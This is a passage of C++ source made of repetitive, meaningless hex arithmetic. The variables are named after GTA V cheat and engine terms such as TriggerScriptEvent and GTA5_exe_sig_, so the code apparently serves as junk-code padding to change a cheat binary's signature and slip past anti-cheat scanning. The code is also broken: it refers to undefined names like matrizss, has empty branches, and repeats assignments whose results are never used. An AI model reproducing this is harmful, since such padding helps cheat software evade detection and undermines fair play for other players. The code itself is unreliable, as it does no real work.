			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<Type>3</Type>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
